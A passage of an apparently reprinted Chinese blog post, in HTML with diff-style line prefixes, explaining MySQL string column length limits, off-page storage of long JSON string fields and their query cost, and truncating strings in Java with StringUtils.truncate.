-<p>假如需要将字段以JSON字符串格式保存在一个数据库字段中，建议只保存相对不重要，且不需要作为唯一的查询条件的字段，在进行保存时也需要考虑字段超长问题，及新旧数据与新旧代码相互之间的兼容问题。</p>
-</blockquote>
-<h4><span id="211-mysql字符串字段长度">2.1.1. MySQL字符串字段长度</span></h4><blockquote>
-<p>半角英文字母、数字、符号等常见字符，1个字符占用1个字节；1个汉字字符占用3个字节。</p>
-<p>在utf8字符集下，1个字符最多占用3个字节，不支持占用4个字节的字符。</p>
-<p>在utf8mb4字符集下，1个字符最多占用4个字节，可以保存emoji表情等占用4个字节的字符。</p>
-<p>MySQL字符串字段的最大长度如下所示：</p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>最大长度</th>
-<th>单位</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CHAR(n)</td>
-<td>255</td>
-<td>字符数</td>
-</tr>
-<tr>
-<td>VARCHAR(n)</td>
-<td>65535</td>
-<td>字符数</td>
-</tr>
-<tr>
-<td>TINYTEXT</td>
-<td>255</td>
-<td>字节数</td>
-</tr>
-<tr>
-<td>TEXT</td>
-<td>65535</td>
-<td>字节数</td>
-</tr>
-<tr>
-<td>MEDIUMTEXT</td>
-<td>16777215</td>
-<td>字节数</td>
-</tr>
-<tr>
-<td>LONGTEXT</td>
-<td>4294967295</td>
-<td>字节数</td>
-</tr>
-</tbody></table>
-<p>需要注意，CHAR、VARCHAR类型字段的最大长度的单位为字符数，能够保存的汉字数量等于最大支持字符数；</p>
-<p>TEXT等类型字段的最大长度的单位为字节数，能够保存的汉字数量不超过最大支持字节数的1&#x2F;3。</p>
-</blockquote>
-<h4><span id="212-mysql使用较长的字符串类型字段影响">2.1.2. MySQL使用较长的字符串类型字段影响</span></h4><blockquote>
-<p>MySQL、MariaDB较新版本支持JSON类型字段，其他版本需要使用字符串类型字段保存。</p>
-<p>MySQL中长度超过768字节的固定长度字段被编码为变长字段，例如VARCHAR（超过768字节）、TEXT等，变长字段被称为页外列（off-page），不是保存在InnoDB的B+树索引中，而是保存在溢出页（overflow page）中。在溢出页中，变长字段的值以单链表形式存储。</p>
-<p>对于保存JSON形式的字符串类型字段，由于需要保存较多内容，很可能属于变长字段。保存JSON形式的字符串类型字段不适合在查询时作为唯一的查询条件，原因如下：</p>
-<p>保存JSON形式的字符串类型字段不适合创建索引：一是JSON字符串中的字段顺序不固定，通过like进行最左匹配查询，很难从保存JSON形式的字段中查询到需要的数据；二是因为InnoDB索引支持的长度有限（在MySQL InnoDB默认配置下，索引支持的最大长度为768字节）；</p>
-<p>仅通过变长字段进行查询时，无法通过B+树结构的索引进行查询，而是需要在单链表形式的溢出页中逐条进行查询，查询效率会非常低。</p>
-<p>查询变长字段，与不查询变长字段相比，开销会更大，耗时会更长。因为查询变长字段时，会增加从溢出页中查询数据的步骤；且需要返回的数据量可能较大，数据返回耗时会增加。</p>
-<p>在查询包含变长字段的数据库表时，假如不需要获取变长字段，则不应该在SQL语句中指定查询变长字段。</p>
-</blockquote>
-<h3><span id="22-可以截断的字段">2.2. 可以截断的字段</span></h3><blockquote>
-<p>对于截断后不影响使用的字段，在写入或更新数据库时，可对存在超长风险的字段按照数据库字段长度进行截断；</p>
-<p>JDK中的String.substring()方法，commons-lang3中的StringUtils.substring()、StringUtils.truncate()方法，参数中的数字单位都是字符数，不是字节数。</p>
-<p>在Java中对字符串进行截取时，建议使用StringUtils.truncate()方法。</p>
-<p>MySQL中的CHAR、VARCHAR类型的最大长度，也是字符数，不是字节数。</p>
-<p>因此在Java中对字符串根据MySQL的字符串类型字段长度进行截取时，两者的长度是一致的。</p>
-<p>例如MySQL中的字段为VARCHAR(200)，则可使用以下方式进行截取，将截取结果写入数据库。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javaStringUtils.truncate(<span class="string">&quot;xxx&quot;</span>, <span class="number">200</span>);</span><br></pre></td></tr></table></figure>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/MySQL/" rel="tag">MySQL</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
